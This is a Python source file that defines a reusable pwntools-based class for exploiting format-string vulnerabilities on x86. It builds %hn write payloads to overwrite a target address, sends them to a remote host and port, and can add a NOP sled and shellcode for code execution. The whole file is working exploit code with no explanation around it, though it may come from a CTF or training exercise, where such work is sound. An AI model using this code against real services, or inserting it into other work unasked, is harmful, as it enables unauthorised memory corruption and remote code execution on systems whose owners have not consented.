# x86
# Overwrite the address of the var `overwrite` with the address of `wanted`
from pwn import *
import socket

class FormatStringExploit:
    def __init__(self, address_overwrite, address_wanted, verbose=False):
        self.address_overwrite = address_overwrite
        self.address_wanted = address_wanted
        self.verbose = verbose

    def split_address(self, address):
        """Split an address into high and low 16 bits."""
        high = (address >> 16) & 0xFFFF
        low = address & 0xFFFF
        if high > low:
            if self.verbose:
                print(f"High 16 bits: {high:#06x}, Low 16 bits: {low:#06x}")
            return high, low, False
        else:
            if self.verbose:
                print(f"High 16 bits: {low:#06x}, Low 16 bits: {high:#06x} (swapped)")
            return low, high, True
    def return_payload(self, offset, stack_alignment=0):
        """Generate the payload to overwrite the address."""
        high_16, low_16, swapped = self.split_address(self.address_wanted)
        
        first_offset = bytes(str(low_16 - stack_alignment - 8), 'utf-8')
        second_offset = bytes(str(high_16 - low_16), 'utf-8')
        payload = b"\x90" * stack_alignment
        payload += p32(self.address_overwrite)  # Address of memset@plt
        payload += p32(self.address_overwrite + 0x2)
        payload += b"%" + first_offset + b"c"
        if swapped:
            payload += b'%' + bytes(str(offset + 1), 'utf-8') + b'$hn'
        else:
            payload += b'%' + bytes(str(offset), 'utf-8') + b'$hn'
        payload += b"%" + second_offset + b"c"
        if swapped:
            payload += b'%' + bytes(str(offset), 'utf-8') + b'$hn'
        else:
            payload += b'%' + bytes(str(offset + 1), 'utf-8') + b'$hn'
        if self.verbose:
            print(f"Payload length: {len(payload)}")
            print(payload)
        return payload
    
    def exploit(self, HOST, PORT, offset):
        """Send the payload to the target server."""
        payload = self.return_payload(offset)
        try:
            s = socket.create_connection((HOST, PORT))
            s.send(payload)
            if self.verbose:
                print("Payload sent successfully.")
            s.close()
        except Exception as e:
            print(f"Error during exploit: {e}")
    def exploit_shellcode(self, HOST, PORT, buf, offset, NOPE=100):
        """Send the payload with shellcode to the target server."""
        payload = self.return_payload(offset)
        payload += b"\x90" * (NOPE - len(payload) - len(buf))
        payload += buf
        try:
            s = socket.create_connection((HOST, PORT))
            s.send(payload)
            if self.verbose:
                print("Payload with shellcode sent successfully.")
            s.close()
        except Exception as e:
            print(f"Error during exploit with shellcode: {e}")